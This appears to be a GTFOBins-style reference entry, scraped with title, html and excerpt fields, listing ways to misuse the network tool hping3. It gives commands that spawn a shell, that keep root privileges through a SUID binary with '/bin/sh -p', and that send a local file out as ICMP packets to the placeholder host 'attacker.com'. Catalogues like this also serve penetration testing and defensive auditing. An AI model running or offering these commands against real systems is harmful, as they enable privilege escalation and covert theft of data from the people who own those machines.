title: hping3
html:
hping3

Shell

hping3
/bin/sh

SUID override:

hping3
/bin/sh -p

Upload

The file is continuously sent as ICMP packets (e.g., of `999` bytes), the optional `--end` parameter signals when the file reached the end.

hping3 attacker.com --icmp --data 999 --sign xxx --file /path/to/input-file
excerpt: hping3 Shell hping3 /bin/sh SUID override: hping3 /bin/sh -p Upload The file is continuously sent as ICMP packets (e.g., of `999` bytes), the optional `--end` parameter signals when the file reached the end. hping3 attacker.com --icmp --data 999…
